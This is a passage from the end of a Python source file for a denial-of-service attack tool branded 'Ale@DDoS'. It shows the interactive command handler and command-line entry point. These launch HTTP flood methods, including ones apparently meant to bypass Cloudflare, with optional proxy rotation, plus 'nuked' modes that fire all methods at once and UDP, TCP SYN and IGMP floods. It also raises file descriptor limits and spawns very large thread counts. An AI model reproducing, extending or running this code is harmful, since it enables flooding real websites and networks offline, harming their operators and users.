    stdout.write("\x1b[38;2;255;20;147m | "+Fore.WHITE+"TIME(s)  "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
    t = input().strip()
    return target, port, thread, t


def LaunchMIX(url, th, duration, use_proxy=False):
    """Balanced mixed attack - rotates through methods on the same target"""
    max_th = int(th)
    
    methods_pool = [
        LaunchRAW, LaunchHTTP2, LaunchPOST,
        LaunchSOC, LaunchSKY, LaunchPPS
    ]
    
    per_method = max(1, max_th // len(methods_pool))
    for method in methods_pool:
        mode = "PROXY" if use_proxy else "DIRECT"
        stdout.write(Fore.CYAN+f"  [*] Mixed: Firing {method.__name__} [{per_method} thr | {mode}]\n")
        t = threading.Thread(target=method, args=(url, per_method, duration, use_proxy), daemon=True)
        t.start()


def command_handler():
    stdout.write(Fore.LIGHTCYAN_EX+"╔═══[""Ale"+Fore.LIGHTGREEN_EX+"@"+Fore.LIGHTCYAN_EX+"DDoS"+Fore.CYAN+"]\n╚══\x1b[38;2;0;255;189m> "+Fore.WHITE)
    cmd = input().strip().lower()

    if cmd in ["cls", "clear"]:
        clear()
        title()
    elif cmd in ["help", "?"]:
        help_menu()
    elif cmd in ["layer7", "l7"]:
        layer7_menu()
    elif cmd in ["layer4", "l4"]:
        layer4_menu()
    elif cmd == "exit":
        exit()

    # ======================= NON-PROXY LAYER7 METHODS (DIRECT) =======================
    elif cmd in ["cfb", "cfsoc", "http2", "get", "post", "soc", "pps", "sky", "bypass", "mix"]:
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,), daemon=True)
        timer.start()
        method_map = {
            "cfb": LaunchCFB, "cfsoc": LaunchCFSOC,
            "http2": LaunchHTTP2, "get": LaunchRAW,
            "post": LaunchPOST, "soc": LaunchSOC,
            "pps": LaunchPPS, "sky": LaunchSKY,
            "bypass": lambda u, th, d, up=False: AttackAggregator(u, th, d, up)._launch_bypass(),
            "mix": LaunchMIX,
        }
        method_map[cmd](target, thread, t, use_proxy=False)
        timer.join()

    # ======================= PROXY LAYER7 METHODS (VIA PROXY) =======================
    elif cmd in ["cfb-p", "cfsoc-p", "http2-p", "get-p", "post-p", "soc-p", "pps-p", "sky-p", "bypass-p", "mix-p"]:
        if not get_proxies():
            stdout.write(Fore.RED+" [x] No proxies available. Running in direct mode.\n")
            use_proxy = False
        else:
            use_proxy = True
            stdout.write(Fore.GREEN+f" [*] Using proxies: {len(proxies)} available\n")

        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,), daemon=True)
        timer.start()
        
        # Strip the -p suffix to get base method name
        base_cmd = cmd.replace("-p", "")
        proxy_map = {
            "cfb": LaunchCFB, "cfsoc": LaunchCFSOC,
            "http2": LaunchHTTP2, "get": LaunchRAW,
            "post": LaunchPOST, "soc": LaunchSOC,
            "pps": LaunchPPS, "sky": LaunchSKY,
            "bypass": lambda u, th, d, up=False: AttackAggregator(u, th, d, up)._launch_bypass(),
            "mix": LaunchMIX,
        }
        proxy_map[base_cmd](target, thread, t, use_proxy=use_proxy)
        timer.join()

    # ======================= NUKED (ALL METHODS - DIRECT) =======================
    elif cmd == "nuked":
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,), daemon=True)
        timer.start()
        agg = AttackAggregator(target, thread, t, use_proxy=False)
        agg.run()
        timer.join()

    # ======================= NUKED-P (ALL METHODS - PROXY) =======================
    elif cmd == "nuked-p":
        if not get_proxies():
            stdout.write(Fore.RED+" [x] No proxies. Running nuked in direct mode.\n")
            use_proxy = False
        else:
            use_proxy = True
            stdout.write(Fore.GREEN+f" [*] Using proxies: {len(proxies)} available\n")
        
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,), daemon=True)
        timer.start()
        agg = AttackAggregator(target, thread, t, use_proxy=use_proxy)
        agg.run()
        timer.join()

    # ======================= LAYER4 METHODS =======================
    elif cmd in ["udp", "tcp", "igmp"]:
        target_ip, port, thread, t = get_info_l4()
        timer = threading.Thread(target=countdown, args=(t,), daemon=True)
        timer.start()
        if cmd == "udp":
            udp_flood(target_ip, port, t, thread)
        elif cmd == "tcp":
            tcp_syn_flood(target_ip, port, t, thread)
        elif cmd == "igmp":
            igmp_flood(target_ip, t, thread)
        timer.join()

    else:
        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"Unknown command. Type 'layer7' to see all commands.\n")


if __name__ == '__main__':
    init(convert=True)

    # Increase file descriptor limit
    try:
        import resource
        resource.setrlimit(resource.RLIMIT_NOFILE, (1048576, 1048576))
    except:
        pass

    if not os.path.exists("./resources"):
        os.makedirs("./resources")

    if len(sys.argv) < 2:
        try:
            ua_list = open('./resources/ua.txt', 'r').read().split('\n')
            if ua_list and ua_list[0]:
                ua = ua_list
        except:
            pass

        clear()
        title()
        while True:
            try:
                command_handler()
            except KeyboardInterrupt:
                stdout.write(Fore.MAGENTA+"\n [>] "+Fore.WHITE+"Interrupted.\n")
            except Exception as e:
                stdout.write(Fore.RED+f"\n [x] Error: {str(e)}\n")

    elif len(sys.argv) >= 6:
        method = sys.argv[1].lower()
        target = sys.argv[2]
        thread = sys.argv[3]
        t = sys.argv[4]
        use_proxy = sys.argv[5].lower() in ['1', 'true', 'proxy', 'yes', 'y']

        if thread == "0":
            thread = str(CPU_COUNT * 25000)

        try:
            ua_list = open('./resources/ua.txt', 'r').read().split('\n')
            if ua_list and ua_list[0]:
                ua = ua_list
        except:
            pass

        if use_proxy and not get_proxies():
            stdout.write(Fore.RED+" [x] No proxies. Falling back to direct mode.\n")
            use_proxy = False

        if method in ["nuked", "nuked-p"]:
            timer = threading.Thread(target=countdown, args=(t,), daemon=True)
            timer.start()
            agg = AttackAggregator(target, thread, t, use_proxy=use_proxy)
            agg.run()
            timer.join()
        elif method in ["cfb", "cfsoc", "http2", "get", "post", "soc", "pps", "sky", "bypass", "mix",
                        "cfb-p", "cfsoc-p", "http2-p", "get-p", "post-p", "soc-p", "pps-p", "sky-p", "bypass-p", "mix-p"]:
            # Strip -p suffix to get base method
            base_method = method.replace("-p", "")
            m = {
                "cfb": LaunchCFB, "cfsoc": LaunchCFSOC, "http2": LaunchHTTP2,
                "get": LaunchRAW, "post": LaunchPOST, "soc": LaunchSOC,
                "pps": LaunchPPS, "sky": LaunchSKY, 
                "bypass": lambda u, th, d, up=False: AttackAggregator(u, th, d, up)._launch_bypass(),
                "mix": LaunchMIX,
            }
            timer = threading.Thread(target=countdown, args=(t,), daemon=True)
            timer.start()
            m[base_method](target, thread, t, use_proxy=use_proxy)
            timer.join()
        else:
            stdout.write(f"Unknown method: {method}\n")
    else:
        stdout.write("Layer7 Methods: cfb, cfsoc, http2, get, post, soc, sky, pps, bypass, mix, nuked\n")
        stdout.write("Add '-p' suffix for proxy mode (e.g., get-p, nuked-p)\n")
        stdout.write(f"Usage: python3 {sys.argv[0]} <method> <target> <thread> <time> [proxy:0/1]\n")
